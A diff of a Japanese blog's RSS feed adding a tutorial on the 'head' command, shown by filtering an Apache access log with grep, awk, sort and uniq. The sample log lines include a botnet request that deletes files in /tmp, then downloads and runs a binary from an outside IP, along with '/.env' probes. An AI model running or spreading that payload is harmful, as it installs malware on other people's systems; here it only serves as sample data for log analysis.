@@ -1,4 +1,236 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NLP</title><link>https://suzukiiichiro.github.io/</link><description>Recent content on NLP</description><generator>Hugo -- gohugo.io</generator><language>ja-jp</language><lastBuildDate>Wed, 09 Feb 2022 12:59:39 +0900</lastBuildDate><atom:link href="https://suzukiiichiro.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>（２）【cat】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</link><pubDate>Wed, 09 Feb 2022 12:59:39 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash.jpg" alt="Featured image of post （２）【cat】シェルスクリプトコマンド活用紹介" />&lt;h2 id="catコマンド">catコマンド&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NLP</title><link>https://suzukiiichiro.github.io/</link><description>Recent content on NLP</description><generator>Hugo -- gohugo.io</generator><language>ja-jp</language><lastBuildDate>Thu, 10 Feb 2022 10:23:14 +0900</lastBuildDate><atom:link href="https://suzukiiichiro.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>（３）【head】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</link><pubDate>Thu, 10 Feb 2022 10:23:14 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/bash.jpg" alt="Featured image of post （３）【head】シェルスクリプトコマンド活用紹介" />&lt;h2 id="headコマンド">headコマンド&lt;/h2>
+&lt;ul>
+&lt;li>headコマンドでファイルの先頭部分だけを表示する&lt;/li>
+&lt;li>パイプを使って実行結果の最初の部分だけを確認する&lt;/li>
+&lt;li>tailコマンドでファイルの末尾部分だけを表示する&lt;/li>
+&lt;li>ログファイルを監視する&lt;/li>
+&lt;/ul>
+&lt;h2 id="概要">概要&lt;/h2>
+&lt;p>headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。表示する行数は、オプションで変更することができます。&lt;/p>
+&lt;p>headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。&lt;/p>
+&lt;h2 id="headコマンドの書式">headコマンドの書式&lt;/h2>
+&lt;p>head [オプション] ファイル名&lt;/p>
+&lt;h2 id="headコマンドの主なオプション">headコマンドの主なオプション&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>オプション&lt;/th>
+&lt;th>長いオプション&lt;/th>
+&lt;th>意味&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>-c 数字&lt;/td>
+&lt;td>&amp;ndash;bytes 数字&lt;/td>
+&lt;td>先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000&lt;em>1000, M=1024&lt;/em>1024…）&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-n 数字&lt;/td>
+&lt;td>&amp;ndash;lines 数字&lt;/td>
+&lt;td>先頭から指定した行数のみ表示する&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-q&lt;/td>
+&lt;td>&amp;ndash;quiet, &amp;ndash;silent&lt;/td>
+&lt;td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-v&lt;/td>
+&lt;td>&amp;ndash;verbose&lt;/td>
+&lt;td>常にファイルごとのヘッダ出力を行う&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="headコマンド詳細説明">headコマンド詳細説明&lt;/h2>
+&lt;p>headコマンドはファイルの先頭から１０行を表示するコマンドです。&lt;/p>
+&lt;pre tabindex="0">&lt;code>$ cat filename | head
+&lt;/code>&lt;/pre>&lt;p>よく使われるオプションは、出力する行数を指定するオプション「n」です。&lt;/p>
+&lt;pre tabindex="0">&lt;code>$ cat filename | head -n20
+&lt;/code>&lt;/pre>&lt;p>データをソートしてベスト１０を出力するという場合によく使います。&lt;/p>
+&lt;pre tabindex="0">&lt;code>$ sudo cat /var/log/httpd/access_log | grep -iv &amp;quot;ELB-Health-Checker&amp;quot; | awk -F '&amp;quot;' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
+&lt;/code>&lt;/pre>&lt;p>sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。&lt;br>
+では、順番に説明していきます。&lt;/p>
+&lt;p>まずは純粋にアクセスログを出力します。&lt;br>
+長いのでheadコマンドを使いましょう。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | head
+172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
+117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
+117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
+:
+:
+:
+&lt;/code>&lt;/pre>&lt;p>AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。&lt;br>
+grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | head
+117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
+117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
+117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
+117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
+98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] &amp;quot;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws&amp;quot; 400 226 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
+61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
+135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;POST / HTTP/1.1&amp;quot; 302 205 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
+135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;GET /.env HTTP/1.1&amp;quot; 302 209 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
+61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
+164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] &amp;quot;CONNECT www.yahoo.com:443 HTTP/1.1&amp;quot; 302 210 &amp;quot;-&amp;quot; &amp;quot;Go-http-client/1.1&amp;quot;
+suzuki$
+&lt;/code>&lt;/pre>&lt;p>それっぽいログが出るようになりました。&lt;br>
+次にどこからのアクセスが多いのかを絞り込みます。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | head
+GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
+CONNECT guba.eastmoney.com:443 HTTP/1.1
+GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
+CONNECT guba.eastmoney.com:443 HTTP/1.1
+GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
+GET http://dushu.baidu.com HTTP/1.1
+POST / HTTP/1.1
+GET /.env HTTP/1.1
+GET http://dushu.baidu.com HTTP/1.1
+CONNECT www.yahoo.com:443 HTTP/1.1
+suzuki$
+&lt;/code>&lt;/pre>&lt;p>GETとPOSTの項目に絞り込まれました。&lt;br>
+awk コマンドの -F はセパレータで、この場合は &amp;lsquo;&amp;quot;&amp;rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。&lt;/p>
+&lt;p>次は、GET, CONNECT, POSTなどのコマンドを除去します。&lt;br>
+awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }' | head
+http://guba.eastmoney.com/list,hk01500_1.html
+guba.eastmoney.com:443
+http://guba.eastmoney.com/list,hk01500_1.html
+guba.eastmoney.com:443
+/shell?cd+/tmp;rm+-rf+*;wget+
+http://dushu.baidu.com
+/
+/.env
+http://dushu.baidu.com
+www.yahoo.com:443
+suzuki$
+&lt;/code>&lt;/pre>&lt;p>次に、余計な出力を抑制します。&lt;br>
+ここでは空白行を出力したくないので grep -v ^$ を使っています。&lt;br>
+非常によく使うオプションなので覚えておくとよいです。&lt;/p>
+&lt;div class="tips-area tips">
+&lt;dl>
+&lt;dt>ヒント&lt;/dt>
+&lt;dd>grep -v ^$&lt;/dd>
+&lt;dd>空行を出力しない&lt;/dd>
+&lt;dd>行頭を表す「^」と行末を表す「$」の間に何もないですね。&lt;/dd>
+&lt;/dl>
+&lt;/div>
+&lt;p>では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
+ort| head
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+110.242.68.4:443
+suzuki$
+&lt;/code>&lt;/pre>&lt;p>最後に、出力をアルファベット順に並べ替えます。sortでよいです。&lt;br>
+さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。&lt;br>
+そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。&lt;/p>
+&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
+850 http://dushu.baidu.com
+839 /form.cgi
+485 http://www.baidu.com/pub/css/new_font.css
+477 /
+265 *
+258 guba.eastmoney.com:443
+253
+209 /.env
+200 www.yahoo.com:443
+184 istock.jrj.com.cn:443
+suzuki$
+&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
+&lt;dl>
+&lt;dt>ヒント&lt;/dt>
+&lt;dt>:sudo cat filename | grep -v &amp;ldquo;除去したい文字列&amp;rdquo; | awk &amp;lsquo;{ print $2; }'| sort | uniq -c |sort -nr | head&lt;/dt>
+&lt;dd>これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。&lt;/dd>
+&lt;/dl>
+&lt;/div>
+&lt;p>head コマンドの紹介の割には長くなりました。&lt;/p>
+&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
+&lt;aside class="amazon-box">
+&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
+&lt;div class="columns amazon-image">
+&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
+&lt;/div>
+&lt;div class="columns amazon-info">
+&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
+&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
+シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
+本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
+基本から丁寧に解説。
+第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
+合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
+ますますパワーアップした改訂版をお届けします。&lt;/p>
+&lt;span class="link">Amazonで詳細を見る&lt;/span>
+&lt;/div>
+&lt;/a>
+&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
+&lt;/aside>
+&lt;aside class="amazon-box">
+&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
+&lt;div class="columns amazon-image">
+&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
+&lt;/div>
+&lt;div class="columns amazon-info">
+&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
+&lt;p>すべてのUNIXエンジニア必携!!
+&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
+知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
+&lt;/p>
+&lt;span class="link">Amazonで詳細を見る&lt;/span>
+&lt;/div>
+&lt;/a>
+&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
+&lt;/aside>
+&lt;aside class="amazon-box">
+&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
+&lt;div class="columns amazon-image">
+&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
+&lt;/div>
+&lt;div class="columns amazon-info">
+&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
+&lt;p>エキスパートを目指せ!!
+&lt;p>システム管理やソフトウェア開発など、&lt;br>
+実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
+&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
+類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
+またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
+イマドキのエンジニア必携の一冊。&lt;/p>
+&lt;p>▼目次&lt;br>
+CHAPTER01 シェルってなんだろう&lt;br>
+CHAPTER02 シェルスクリプトとは何か&lt;br>
+CHAPTER03 シェルスクリプトの基本&lt;br>
+CHAPTER04 変数&lt;br>
+CHAPTER05 クォーティング&lt;br>
+CHAPTER06 制御構造&lt;br>
+CHAPTER07 リダイレクトとパイプ&lt;br>
+CHAPTER08 関数&lt;br>
+CHAPTER09 組み込みコマンド&lt;br>
+CHAPTER10 正規表現と文字列&lt;br>
+CHAPTER11 シェルスクリプトの実行方法&lt;br>
+CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
+CHAPTER13 シェルスクリプトの実用例&lt;br>
+CHAPTER14 テストとデバッグ&lt;br>
+CHAPTER15 読みやすいシェルスクリプト&lt;/p>
+&lt;/p>
+&lt;span class="link">Amazonで詳細を見る&lt;/span>
+&lt;/div>
+&lt;/a>
+&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
+&lt;/aside></description></item><item><title>（２）【cat】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</link><pubDate>Wed, 09 Feb 2022 12:59:39 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash.jpg" alt="Featured image of post （２）【cat】シェルスクリプトコマンド活用紹介" />&lt;h2 id="catコマンド">catコマンド&lt;/h2>
 &lt;ul>
 &lt;li>ファイルの内容を表示する&lt;/li>
 &lt;li>ファイルの内容を行番号付きで表示する&lt;/li>
@@ -1536,1636 +1768,4 @@ FA[0]は1ですので443行目から446行目の処理には入らず次のfor�
 ローカル変数については特別にプログラムしないでも再帰前の状態に戻るのですが、グローバル変数は自分で設定しないと元に戻りません。&lt;br>
 再帰から戻ってきた時はiにクイーンを置かなかったことになるのですから&lt;br>
 FA[i]=0で明示的にフラグを落としてあげています。&lt;/p>
-&lt;p>今回は配置フラグの全体的な流れを説明しました。次回は図で説明しながら実際の動きを追ってみましょう。&lt;/p></description></item><item><title>【grep/sed/awkも】ざっくりわかるシェルスクリプト５」</title><link>https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/</link><pubDate>Wed, 02 Feb 2022 15:55:47 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript.jpg" alt="Featured image of post 【grep/sed/awkも】ざっくりわかるシェルスクリプト５」" />&lt;p>この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。&lt;br>
-過去、bashの経験があり、久しぶりにbashを書く必要に迫られた人、他の言語でプログラム経験があり、bash独自の書き方をざっくりと思い出したい人は、このトピックを長め読むだけで、充分 bashを思い出せるはずです。&lt;br>
-このトピックをざっくり読み流すとおよそ４５分でbashの構文を網羅的に理解することができます。&lt;/p>
-&lt;p>では次のトピックについて説明します。&lt;/p>
-&lt;h2 id="はじめてのシェルスクリプト">はじめてのシェルスクリプト&lt;/h2>
-&lt;p>このトピックでは、catコマンドでシェルの場所を確認後、スクリプトファイルの作成、echoコマンドを使用して「Hello,shellscript.」記述し、スクリプトファイルを実行可能にします。&lt;/p>
-&lt;p>ではまず、ターミナルに次のコマンドを入力します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat /etc/shells
-&lt;/code>&lt;/pre>&lt;p>実行するとおおよそ次の出力となります。&lt;/p>
-&lt;p>$ cat /etc/shells&lt;br>
-/bin/sh&lt;br>
-/bin/bash&lt;br>
-/sbin/nologin&lt;br>
-/usr/bin/sh&lt;br>
-/usr/bin/bash&lt;br>
-/usr/sbin/nologin&lt;br>
-$&lt;/p>
-&lt;p>このコマンドは、システムで利用可能なすべてのシェルを表示し、それらのいずれかを使用できます。&lt;br>
-このタスクでシステムにbashシェルがあるかどうかを確認できました。bashのパスを知るには、ターミナルで「$ which bash」を実行します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ which bash
-/usr/bin/bash
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>このパスをシェバンといいます。シェルスクリプトを実行する「bash」のPATHは「/usr/bin/bash」であることがわかりました。このシェバンを、すべてのシェルスクリプトのページ先頭に書き込む必要があります。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;p>シェバンをソースファイルの先頭行に書きます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/usr/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ではさっそく「helloScript.sh」ファイルに「Hello,shellscript.」を記述しましょう。内容は以下の通りです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを保存し、ターミナルに戻り、「ls」コマンドを実行してファイルの存在を確認します。「ls -la」を使用してファイルの詳細を取得することもできます。&lt;br>
-その結果は、次のようになります。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ ls
-helloScript.sh
-$
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ ls -la
--rw-rw-r-- 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh
-$
-&lt;/code>&lt;/pre>&lt;p>&amp;lsquo;rw-rw-r&amp;rsquo; は、ファイルの所有者が、ファイへの読み取り、および書き込み権限を持っていることを示します。&lt;/p>
-&lt;p>読むことができる (Readable) r 4&lt;br>
-書くことができる (Writable) w 2&lt;br>
-実行することができる (eXecutable) x 1&lt;br>
-なにもできない - 0&lt;/p>
-&lt;p>３つのブロックにわかれているのは、グループを示しています。&lt;/p>
-&lt;p>自分 グループ 他人&lt;br>
-xrw xrw xrw&lt;/p>
-&lt;p>現在のhelloScript.shは -rw ですから、読むことと、書くことはできるものの、実行する権限がないようです。&lt;br>
-このスクリプトを実行可能にするには、ターミナルで次のコマンドを実行する必要があります。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ chmod +x helloScript.sh
-&lt;/code>&lt;/pre>&lt;p>次に、「ls -la」コマンドを使用して「helloScript.sh」ファイルのアクセス許可を確認し、次の出力が得られます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ ls -la
--rwxrwxr-x 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh
-$
-&lt;/code>&lt;/pre>&lt;p>実行権限が付きました。&lt;br>
-次に、ターミナルのコマンド「$ bash /helloScript.sh」を使用してファイルを実行します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ ./helloScript.sh
-Hello, shell script.
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>ファイルの実行方法はざっくりと２種類あります。&lt;/dd>
-&lt;dd>$ chmod +x &amp;lt;ファイル名&amp;gt;&lt;/dd>
-&lt;dd>で、実行権限を与えたうえで、&lt;/dd>
-&lt;dd>$ ./&amp;lt;ファイル名&amp;gt;&lt;/dd>
-&lt;dd>とする方法。&lt;/dd>
-&lt;dd>
-&lt;p>ファイルに実行権限を与えずに&lt;/p>
-&lt;/dd>
-&lt;dd>$ bash &amp;lt;ファイル名&amp;gt;&lt;/dd>
-&lt;dd>と、する方法です。&lt;/dd>
-&lt;dd>
-&lt;p>セキュリティ的には後者が望ましいです。&lt;/p>
-&lt;/dd>
-&lt;dd>理由は、悪意を持つ第三者、または誤操作によってスクリプトファイルが簡単に実行できてしまう環境を作るべきではないからです。&lt;/dd>
-&lt;dd>何のファイルかわかりもせずに　&lt;/dd>
-&lt;dd>$ ./&amp;lt;ファイル名&amp;gt;&lt;/dd>
-&lt;dd>で実行できてしまうのは恐怖です。&lt;/dd>
-&lt;dd>実行する場合、ソースの中身を確認するのはもちろんですが、実行権限を軽率に与えることは控えましょう。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="ファイルへの出力">ファイルへの出力&lt;/h2>
-&lt;p>このトピックでは、シェルスクリプトの実行結果を、別のファイルに出力する方法を紹介します。「helloScript.sh」の echo 行の末尾に少し追記するだけです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, shell script.&amp;#34;&lt;/span> &amp;gt; hello.txt&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを保存し、「$ bash helloScript.sh」でスクリプトを実行します。&lt;br>
-次の出力が表示されます。「ls -la」を押して、新しいファイルが存在することを確認してください。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ ls -la
-helloScript.sh hello.txt
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>「&amp;gt;」をリダイレクトと言います。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;p>ファイルの出力は２種類あります。&lt;br>
-リダイレクト出力は、新規に空のファイルを作成したうえで文字を出力します。&lt;br>
-もう一つの出力方法は「アペンド &amp;raquo; 」です。&lt;br>
-アペンドは、既に存在するファイルに追記します。&lt;br>
